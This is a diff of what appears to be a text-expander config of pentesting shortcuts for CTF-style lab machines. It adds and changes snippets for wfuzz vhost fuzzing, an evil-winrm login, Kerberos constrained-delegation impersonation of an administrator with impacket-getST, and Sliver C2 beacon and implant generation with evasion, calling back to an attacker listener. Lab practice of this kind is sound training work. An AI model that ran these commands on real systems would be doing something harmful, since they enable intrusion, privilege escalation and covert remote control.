@@ -48,7 +48,7 @@ matches:
     replace: "sudo nmap -sC -sV -p- -oA nmap/nmap_allports"
 
   - trigger: ":scan_wfuzz"
-    replace: 'sudo wfuzz -c -f wfuzz.vhosts -Z -w gobuster/best-dns-wordlist.txt -u "http://DNS.htb" -H "Host: FUZZ.DNS.htb"'
+    replace: 'sudo wfuzz -c -f wfuzz.vhosts -Z -w gobuster/subdomains-top1million-110000.txt -u "http://DNS.htb" -H "Host: FUZZ.DNS.htb"'
 
   - trigger: ":scan_gobuster"
     replace: "gobuster dir -u http://brainmoustache.ca -w gobuster/directory-list-2.3-medium.txt -o gobuster/root.gobuster-fuzz -x php"
@@ -68,6 +68,24 @@ matches:
       $user = "DOMAIN\\USERNAME"
       $cred = New-Object System.Management.Automation.PSCredential($user,$password)
       Enter-PSSession -ComputerName  -Credential $cred -Authentication Negotiate
+
+  - trigger: ":evil-winrm"
+    replace: evil-winrm -u <user> -p <password> -i <ip>
+
+  - trigger: ":krb_help"
+    replace: |-
+      "\n-----------------------
+      | dcsync |  LDAP  |
+      | psexec |  CIFS  |
+      | winrm |  HOST & HTTP  |
+      -----------------------"
+
+  # For dcsync
+  - trigger: ":krb_constrained"
+    replace: impacket-getST -spn 'CIFS/dc.painters.htb' -impersonate 'administrator' -altservice 'ldap' 'PAINTERS.HTB/blake:newP@ssword2022' -dc-ip 192.168.110.55
+
+  - trigger: ":krb_export"
+    replace: export KRB5CCNAME=xx.ccache
 
   #### Donpapi
   - trigger: ":donpapi_domain"
@@ -185,12 +203,15 @@ matches:
     replace: stty raw -echo; fg
 
   #### Sliver
-  - trigger: ":sliver_beacon"
+  - trigger: ":sliver_profile"
     replace: profiles new beacon --evasion --os windows --format shellcode -b http://{{LHOST}} win-http
+
   - trigger: ":sliver_listener"
-    replace: stage-listener --url http://{{LHOST}}:80 --profile win-profile
+    replace: stage-listener --url http://{{LHOST}}:80 --profile win-http
+
   - trigger: ":sliver_generate"
-    replace: generate beacon --profile win-http --save sbrain.exe
+    replace: generate beacon --http http://{{LHOST}}:80 --save /tmp/sbrain.exe
+
   - trigger: ":sliver_implant"
     replace: regenerate --save /tmp/LEGITIMATE LEGITIMATE_CARNATION
 
